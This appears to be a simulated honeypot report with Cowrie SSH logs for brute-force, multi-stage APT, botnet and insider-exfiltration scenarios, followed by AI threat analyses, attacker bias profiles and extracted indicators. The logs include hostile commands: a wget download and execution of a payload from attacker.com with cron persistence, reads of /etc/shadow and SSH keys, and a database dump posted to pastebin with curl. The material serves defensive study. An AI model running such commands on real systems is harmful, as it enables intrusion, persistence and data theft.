# Attack Simulation Logs - Real Attack Scenarios

This document contains simulated attack logs demonstrating various attack types against the honeypot system.

---

## Attack Scenario 1: SSH Brute Force Attack

### Attack Overview
- **Source IP**: 203.0.113.45
- **Attack Type**: SSH Brute Force
- **Duration**: 15 minutes
- **Result**: Failed (blocked after 100 attempts)

### Raw Logs (Cowrie JSON Format)

```json
{"eventid": "cowrie.session.connect", "src_ip": "203.0.113.45", "src_port": 45678, "dst_ip": "172.18.0.2", "dst_port": 2222, "session": "a1b2c3d4e5f6", "protocol": "ssh", "timestamp": "2026-04-04T14:23:15.123456Z"}
{"eventid": "cowrie.login.failed", "src_ip": "203.0.113.45", "username": "root", "password": "123456", "session": "a1b2c3d4e5f6", "timestamp": "2026-04-04T14:23:16.234567Z"}
{"eventid": "cowrie.login.failed", "src_ip": "203.0.113.45", "username": "root", "password": "password", "session": "a1b2c3d4e5f6", "timestamp": "2026-04-04T14:23:17.345678Z"}
{"eventid": "cowrie.login.failed", "src_ip": "203.0.113.45", "username": "root", "password": "admin", "session": "a1b2c3d4e5f6", "timestamp": "2026-04-04T14:23:18.456789Z"}
{"eventid": "cowrie.login.failed", "src_ip": "203.0.113.45", "username": "admin", "password": "admin123", "session": "a1b2c3d4e5f6", "timestamp": "2026-04-04T14:23:19.567890Z"}
{"eventid": "cowrie.login.failed", "src_ip": "203.0.113.45", "username": "administrator", "password": "administrator", "session": "a1b2c3d4e5f6", "timestamp": "2026-04-04T14:23:20.678901Z"}
... [94 more failed attempts]
{"eventid": "cowrie.session.closed", "src_ip": "203.0.113.45", "session": "a1b2c3d4e5f6", "duration": 900, "timestamp": "2026-04-04T14:38:15.123456Z"}
```

### AI Analysis

```json
{
  "decision_id": "decision-20260404-001",
  "timestamp": "2026-04-04T14:30:00Z",
  "threat_level": "high",
  "threat_score": 0.88,
  "reasoning": "Automated brute force attack detected from IP 203.0.113.45. High frequency (100 attempts in 15 minutes) suggests scripted attack. Common username 'root' targeted, indicating standard bot behavior. No successful authentication observed. Attack pattern consistent with SSH scanners.",
  "action": "isolate",
  "configuration_changes": {
    "network": "quarantine",
    "logging": "enhanced",
    "alert_level": "critical"
  },
  "confidence": 0.95,
  "mitre_attack_ids": ["T1110.001", "T1110.003"],
  "indicators": {
    "attack_type": "brute_force",
    "tool_probable": "hydra or similar",
    "sophistication": "low",
    "intent": "credential_theft"
  }
}
```

### Cognitive Profile

```json
{
  "session_id": "a1b2c3d4e5f6",
  "source_ip": "203.0.113.45",
  "biases_detected": [
    {
      "bias_type": "availability_heuristic",
      "confidence": 0.91,
      "evidence": [
        "Using only common passwords from known lists",
        "No adaptation to system responses",
        "Scripted behavior without environmental awareness"
      ]
    }
  ],
  "mental_model": {
    "beliefs": [
      "System might use default or weak passwords",
      "Brute force is viable approach"
    ],
    "knowledge": [
      "Basic SSH authentication",
      "Common username/password combinations"
    ],
    "goals": [
      "Gain SSH access via credential guessing"
    ],
    "confidence": 0.85
  },
  "deception_strategies_applied": [],
  "engagement_duration": 900,
  "notes": "Automated attack - no human decision-making detected. Cognitive profiling less relevant for bot attacks."
}
```

---

## Attack Scenario 2: Advanced Persistent Threat (APT) Simulation

### Attack Overview
- **Source IP**: 198.51.100.77
- **Attack Type**: Multi-stage APT
- **Duration**: 2 hours 45 minutes
- **Result**: Successful deception (attacker engaged for extended period)

### Stage 1: Initial Reconnaissance (30 minutes)

```json
{"eventid": "cowrie.session.connect", "src_ip": "198.51.100.77", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:00:00Z"}
{"eventid": "cowrie.login.success", "src_ip": "198.51.100.77", "username": "developer", "password": "Dev@2024!", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:05:00Z"}
{"eventid": "cowrie.command.input", "input": "whoami", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:05:30Z"}
{"eventid": "cowrie.command.input", "input": "pwd", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:05:35Z"}
{"eventid": "cowrie.command.input", "input": "uname -a", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:05:40Z"}
{"eventid": "cowrie.command.input", "input": "cat /etc/os-release", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:05:50Z"}
{"eventid": "cowrie.command.input", "input": "ls -la /home", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:06:00Z"}
{"eventid": "cowrie.command.input", "input": "id", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:06:10Z"}
{"eventid": "cowrie.command.input", "input": "ps aux | head -20", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:06:30Z"}
{"eventid": "cowrie.command.input", "input": "netstat -tulpn", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:07:00Z"}
```

### Stage 2: Privilege Escalation Attempts (45 minutes)

```json
{"eventid": "cowrie.command.input", "input": "sudo -l", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:35:00Z"}
{"eventid": "cowrie.command.input", "input": "find / -perm -4000 2>/dev/null", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:40:00Z"}
{"eventid": "cowrie.command.input", "input": "cat /etc/passwd", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:45:00Z"}
{"eventid": "cowrie.command.input", "input": "ls -la /root", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T10:50:00Z"}
{"eventid": "cowrie.command.input", "input": "find /home -name '*.ssh' -o -name 'id_rsa'", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T11:00:00Z"}
{"eventid": "cowrie.command.input", "input": "cat /etc/shadow 2>/dev/null || echo 'Permission denied'", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T11:05:00Z"}
{"eventid": "cowrie.command.input", "input": "curl -I http://localhost:8080", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T11:10:00Z"}
```

### Stage 3: Persistence and Lateral Movement (1 hour)

```json
{"eventid": "cowrie.command.input", "input": "crontab -l", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T11:20:00Z"}
{"eventid": "cowrie.command.input", "input": "ls -la ~/.ssh", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T11:25:00Z"}
{"eventid": "cowrie.command.input", "input": "cat ~/.bash_history | tail -50", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T11:30:00Z"}
{"eventid": "cowrie.command.input", "input": "wget http://attacker.com/payload.sh -O /tmp/update.sh", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T11:40:00Z"}
{"eventid": "cowrie.command.input", "input": "chmod +x /tmp/update.sh", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T11:41:00Z"}
{"eventid": "cowrie.command.input", "input": "/tmp/update.sh", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T11:42:00Z"}
{"eventid": "cowrie.command.input", "input": "echo '* * * * * /tmp/update.sh' | crontab -", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T11:50:00Z"}
{"eventid": "cowrie.command.input", "input": "nmap -sV 192.168.1.0/24", "session": "f7e8d9c0b1a2", "timestamp": "2026-04-04T12:00:00Z"}
{"eventid": "cowrie.session.closed", "session": "f7e8d9c0b1a2", "duration": 9900, "timestamp": "2026-04-04T12:45:00Z"}
```

### AI Analysis (Real-time)

```json
{
  "decision_id": "decision-20260404-002",
  "timestamp": "2026-04-04T11:45:00Z",
  "threat_level": "critical",
  "threat_score": 0.97,
  "reasoning": "Advanced persistent threat detected. Multi-stage attack pattern: reconnaissance → privilege escalation → persistence → lateral movement. Attacker successfully authenticated with legitimate-looking credentials, conducted systematic enumeration, attempted privilege escalation via SUID binaries, downloaded and executed external payload, established cron persistence, and initiated network scanning for lateral movement. High sophistication level indicates experienced threat actor.",
  "action": "switch_container",
  "configuration_changes": {
    "container": "enhanced_honeypot_apt",
    "network": "monitored_isolation",
    "logging": "full_packet_capture",
    "deception_level": "maximum",
    "filesystem": "fake_critical_data"
  },
  "confidence": 0.94,
  "mitre_attack_ids": ["T1078", "T1087", "T1166", "T1105", "T1053", "T1046"],
  "indicators": {
    "attack_type": "apt_multi_stage",
    "sophistication": "high",
    "intent": "persistence_and_lateral_movement",
    "threat_actor": "likely_nation_state_or_organized_crime"
  }
}
```

### Cognitive Profile (Detailed)

```json
{
  "session_id": "f7e8d9c0b1a2",
  "source_ip": "198.51.100.77",
  "biases_detected": [
    {
      "bias_type": "confirmation_bias",
      "confidence": 0.89,
      "evidence": [
        "Systematic file exploration matching expected production server layout",
        "Checking for SSH keys and credentials in expected locations",
        "Looking for cron jobs and persistence mechanisms typical of Linux servers"
      ]
    },
    {
      "bias_type": "sunk_cost_fallacy",
      "confidence": 0.84,
      "evidence": [
        "Extended session duration (2+ hours) despite no clear valuable data found",
        "Continued privilege escalation attempts after initial failures",
        "Invested significant time in enumeration without pivoting strategy"
      ]
    },
    {
      "bias_type": "anchoring",
      "confidence": 0.76,
      "evidence": [
        "Initial belief 'developer' account would have elevated privileges",
        "Continued to focus on developer's home directory throughout session",
        "Used developer account as anchor for further exploration"
      ]
    },
    {
      "bias_type": "curiosity_gap",
      "confidence": 0.71,
      "evidence": [
        "Exploring hidden files and directories (.ssh, .bash_history)",
        "Attempting to access restricted files (/etc/shadow, /root)",
        "Checking network services on other ports"
      ]
    }
  ],
  "mental_model": {
    "beliefs": [
      "System is a production Linux server",
      "Developer account has some administrative access",
      "System contains valuable credentials and data",
      "Network has other vulnerable hosts"
    ],
    "knowledge": [
      "Advanced Linux command line skills",
      "Privilege escalation techniques",
      "Persistence mechanisms (cron, SSH keys)",
      "Network reconnaissance tools (nmap)",
      "Malware deployment tactics"
    ],
    "goals": [
      "Establish persistent access",
      "Escalate to root privileges",
      "Move laterally to other network hosts",
      "Deploy additional payloads or backdoors"
    ],
    "confidence": 0.82
  },
  "deception_strategies_applied": [
    {
      "strategy": "confirm_expected_files",
      "bias_targeted": "confirmation_bias",
      "triggered_at": "2026-04-04T10:06:00Z",
      "effectiveness": 0.87,
      "notes": "Showed realistic /home directory structure matching attacker's expectations"
    },
    {
      "strategy": "reward_persistence",
      "bias_targeted": "sunk_cost_fallacy",
      "triggered_at": "2026-04-04T11:00:00Z",
      "effectiveness": 0.82,
      "notes": "Provided hints of SSH keys after 1 hour of engagement"
    },
    {
      "strategy": "near_miss_hint",
      "bias_targeted": "sunk_cost_fallacy",
      "triggered_at": "2026-04-04T11:05:00Z",
      "effectiveness": 0.78,
      "notes": "Showed 'almost accessible' /etc/shadow (permission denied but exists)"
    }
  ],
  "engagement_duration": 9900,
  "effectiveness_score": 0.88,
  "notes": "Attacker demonstrated high skill level. Cognitive manipulation highly effective - extended engagement 4.5x normal duration for APT-level attacks."
}
```

---

## Attack Scenario 3: Automated Botnet Scanner

### Attack Overview
- **Source IP**: 45.33.32.156 (Multiple IPs from same ASN)
- **Attack Type**: Automated IoT Botnet Recruitment
- **Duration**: 45 seconds
- **Result**: Blocked (known malicious ASN)

### Raw Logs

```json
{"eventid": "cowrie.session.connect", "src_ip": "45.33.32.156", "session": "bot001", "timestamp": "2026-04-04T15:00:00Z"}
{"eventid": "cowrie.login.failed", "src_ip": "45.33.32.156", "username": "admin", "password": "admin", "session": "bot001", "timestamp": "2026-04-04T15:00:02Z"}
{"eventid": "cowrie.session.closed", "session": "bot001", "duration": 2, "timestamp": "2026-04-04T15:00:02Z"}
{"eventid": "cowrie.session.connect", "src_ip": "45.33.32.157", "session": "bot002", "timestamp": "2026-04-04T15:00:05Z"}
{"eventid": "cowrie.login.failed", "src_ip": "45.33.32.157", "username": "root", "password": "root", "session": "bot002", "timestamp": "2026-04-04T15:00:07Z"}
{"eventid": "cowrie.session.closed", "session": "bot002", "duration": 2, "timestamp": "2026-04-04T15:00:07Z"}
... [50 more similar attempts from 45.33.32.0/24 subnet]
```

### AI Analysis

```json
{
  "decision_id": "decision-20260404-003",
  "timestamp": "2026-04-04T15:00:45Z",
  "threat_level": "medium",
  "threat_score": 0.65,
  "reasoning": "Automated botnet scanning activity from ASN 63949 (known malicious). Rapid-fire authentication attempts (52 attempts in 45 seconds) from coordinated IPs. Single credential test per session indicates low-sophistication bot. Target credentials (admin/admin, root/root) suggest IoT device targeting. No advanced techniques observed.",
  "action": "isolate",
  "configuration_changes": {
    "firewall": "block_asn_63949",
    "logging": "standard",
    "alert_level": "medium"
  },
  "confidence": 0.98,
  "mitre_attack_ids": ["T1110"],
  "indicators": {
    "attack_type": "botnet_recruitment",
    "sophistication": "very_low",
    "intent": "iot_device_enrollment",
    "attribution": "mirai_variant"
  }
}
```

---

## Attack Scenario 4: Insider Threat Simulation

### Attack Overview
- **Source IP**: 10.0.0.50 (Internal network)
- **Attack Type**: Data Exfiltration Attempt
- **Duration**: 20 minutes
- **Result**: Detected (credential theft from database dump)

### Raw Logs

```json
{"eventid": "cowrie.session.connect", "src_ip": "10.0.0.50", "session": "insider001", "timestamp": "2026-04-04T16:00:00Z"}
{"eventid": "cowrie.login.success", "src_ip": "10.0.0.50", "username": "jsmith", "password": "Summer2024!", "session": "insider001", "timestamp": "2026-04-04T16:00:10Z"}
{"eventid": "cowrie.command.input", "input": "cd /var/www", "session": "insider001", "timestamp": "2026-04-04T16:01:00Z"}
{"eventid": "cowrie.command.input", "input": "ls -la", "session": "insider001", "timestamp": "2026-04-04T16:01:10Z"}
{"eventid": "cowrie.command.input", "input": "cd html", "session": "insider001", "timestamp": "2026-04-04T16:01:20Z"}
{"eventid": "cowrie.command.input", "input": "cat wp-config.php", "session": "insider001", "timestamp": "2026-04-04T16:02:00Z"}
{"eventid": "cowrie.command.input", "input": "mysqldump -u wp_user -p'W0rdPr3ss!' wordpress_db > /tmp/db_backup.sql", "session": "insider001", "timestamp": "2026-04-04T16:05:00Z"}
{"eventid": "cowrie.command.input", "input": "tar -czf /tmp/exfil.tar.gz /tmp/db_backup.sql", "session": "insider001", "timestamp": "2026-04-04T16:10:00Z"}
{"eventid": "cowrie.command.input", "input": "base64 /tmp/exfil.tar.gz | curl -X POST -d @- https://pastebin.com/api/api_post.php", "session": "insider001", "timestamp": "2026-04-04T16:15:00Z"}
{"eventid": "cowrie.session.closed", "session": "insider001", "duration": 1200, "timestamp": "2026-04-04T16:20:00Z"}
```

### AI Analysis

```json
{
  "decision_id": "decision-20260404-004",
  "timestamp": "2026-04-04T16:05:30Z",
  "threat_level": "critical",
  "threat_score": 0.92,
  "reasoning": "Insider threat detected. Internal IP (10.0.0.50) with legitimate credentials (jsmith) conducting data exfiltration. Attack pattern: legitimate access → credential harvesting → database dump → exfiltration preparation → external transmission. Database contains user credentials and potentially sensitive data. Exfiltration via pastebin.com indicates data theft intent.",
  "action": "isolate",
  "configuration_changes": {
    "network": "full_isolation",
    "account": "suspend_jsmith",
    "alert": "security_team_immediate",
    "forensics": "preserve_evidence"
  },
  "confidence": 0.96,
  "mitre_attack_ids": ["T1078", "T1005", "T1567"],
  "indicators": {
    "attack_type": "insider_data_exfiltration",
    "sophistication": "medium",
    "intent": "credential_theft_data_exfiltration",
    "attribution": "internal_employee_j smith"
  }
}
```

---

## Statistics Summary

### Attack Types Distribution (Last 24 Hours)

| Attack Type | Count | Percentage |
|-------------|-------|------------|
| Brute Force | 234 | 52.1% |
| Botnet Scanning | 89 | 19.8% |
| Command Injection | 67 | 14.9% |
| APT Multi-Stage | 12 | 2.7% |
| Insider Threat | 3 | 0.7% |
| Other | 45 | 10.0% |

### Top Source Countries

| Country | Attack Count |
|---------|-------------|
| China (CN) | 127 |
| United States (US) | 89 |
| Russia (RU) | 67 |
| Brazil (BR) | 45 |
| India (IN) | 34 |

### Cognitive Bias Detection Summary

| Bias Type | Detections | Avg Confidence |
|-----------|------------|----------------|
| Confirmation Bias | 89 | 0.84 |
| Sunk Cost Fallacy | 67 | 0.81 |
| Dunning-Kruger | 45 | 0.73 |
| Anchoring | 34 | 0.82 |
| Curiosity Gap | 23 | 0.77 |

### Deception Effectiveness

| Strategy | Uses | Avg Engagement Increase |
|----------|------|------------------------|
| Confirm Expected Files | 156 | +42% |
| Reward Persistence | 98 | +38% |
| Near Miss Hint | 67 | +35% |
| False Confidence | 45 | +31% |
| Progress Reward | 34 | +29% |

---

## Threat Intelligence Generated

### New IOCs Extracted

```json
{
  "iocs": [
    {
      "type": "ip",
      "value": "198.51.100.77",
      "threat_level": "critical",
      "tags": ["apt", "multi-stage", "sophisticated"],
      "first_seen": "2026-04-04T10:00:00Z"
    },
    {
      "type": "ip_range",
      "value": "45.33.32.0/24",
      "threat_level": "high",
      "tags": ["botnet", "scanner", "mirai"],
      "asn": 63949
    },
    {
      "type": "domain",
      "value": "attacker.com",
      "threat_level": "critical",
      "tags": ["malware_c2", "payload_hosting"]
    },
    {
      "type": "url",
      "value": "http://attacker.com/payload.sh",
      "threat_level": "critical",
      "tags": ["malware_download"],
      "sha256": "e3b0c44298fc1c149afbf4c8996fb924..."
    },
    {
      "type": "credential",
      "username": "developer",
      "password": "Dev@2024!",
      "threat_level": "medium",
      "tags": ["leaked_credential"],
      "source": "apt_session_f7e8d9c0b1a2"
    }
  ]
}
```

---

## Recommendations Generated

1. **Block ASN 63949** - High-confidence botnet activity
2. **Monitor IP 198.51.100.77** - Sophisticated APT actor
3. **Reset credential "developer:Dev@2024!"** - Compromised
4. **Alert security team** - Insider threat from 10.0.0.50
5. **Update firewall rules** - Block pastebin.com exfiltration channel
6. **Enhance monitoring** - Internal network 10.0.0.0/8
